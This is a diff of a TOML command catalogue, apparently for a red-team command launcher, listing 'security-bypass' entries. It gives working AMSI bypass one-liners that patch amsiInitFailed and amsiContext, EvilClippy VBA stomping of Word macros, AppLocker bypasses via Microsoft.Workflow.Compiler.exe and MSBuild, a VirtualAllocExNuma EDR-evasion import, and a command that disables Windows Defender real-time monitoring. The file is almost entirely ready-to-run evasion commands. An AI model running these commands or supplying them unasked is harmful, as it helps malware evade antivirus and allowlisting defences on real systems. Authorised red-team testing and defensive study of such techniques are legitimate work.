@@ -2,21 +2,48 @@
 use_name = "AMSI Bypass"
 local = true
 cmd_types = "security-bypass"
-args = "$a=[Ref].Assembly.GetTypes();foreach($b in $a) {if ($b.Name -Like '*iUtil*'){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e -Like '*InitF*'){$f=$e}};$f.SetValue($null,$true)"
 short_desc = "AMSI Bypass `amsiInitFailed` technique"
+args = "$a=[Ref].Assembly.GetTypes();foreach($b in $a) {if ($b.Name -Like '*iUtil*'){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e -Like '*InitF*'){$f=$e}};$f.SetValue($null,$true)"
 
 
 [command.AMSI-Bypass-1]
 use_name = "AMSI Bypass"
 local = true
 cmd_types = "security-bypass"
-args = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy(@(0), 0, [IntPtr]$ref, 1)"
 short_desc = "AMSI Bypass `amsiContext` patch technique"
+args = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy(@(0), 0, [IntPtr]$ref, 1)"
 
 [command.VBA-Stomping]
 use_name = "EvilClippy - VBA Stomping"
 local = true
 cmd_types = "security-bypass"
-args = ".\\EvilClippy.exe -n <macro-name|MyMacro> <word-doc-path|C:\\Users\\user\\Downloads\\Doc1.doc>"
 short_desc = "VBA Stomping to increase stealth (using: a `Word 1997-2003` Type Document)"
+args = ".\\EvilClippy.exe -n <macro-name|MyMacro> <word-doc-path|C:\\Users\\user\\Downloads\\Doc1.doc>"
 
+[command.MicrosoftWorkflowCompiler]
+use_name = "Microsoft.Workflow.Compiler.exe"
+local = true
+cmd_types = "security-bypass"
+short_desc = "AppLocker bypass - Microsoft.Workflow.Compiler XML call"
+args = "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe run.xml results.xml"
+
+[command.AppLockerBypassMSBuild]
+use_name = "MSBuild.exe"
+local = true
+cmd_types = "security-bypass"
+short_desc = "AppLocker bypass - MSBuild"
+args = "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe .\\test.csproj"
+
+[command.NonEmulatedAPI]
+use_name = "VirtualAllocExNuma - NonEmulatedAPI"
+local = true
+cmd_types = "security-bypass"
+short_desc = "EV-EDR bypass with NonEmulatedAPI - VirtualAllocExNuma (.NET Framework)"
+args = "[DllImport('kernel32.dll', SetLastError = true, ExactSpelling = true)]static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);"
+
+[command.DisableRealtimeMonitoring]
+use_name = "Disable RealTime Monitoring"
+local = true
+cmd_types = "security-bypass"
+short_desc = "Disable Windows Defender Realtime Monitoring Protection"
+args = "Set-MpPreference -DisableRealTimeMonitoring $true"
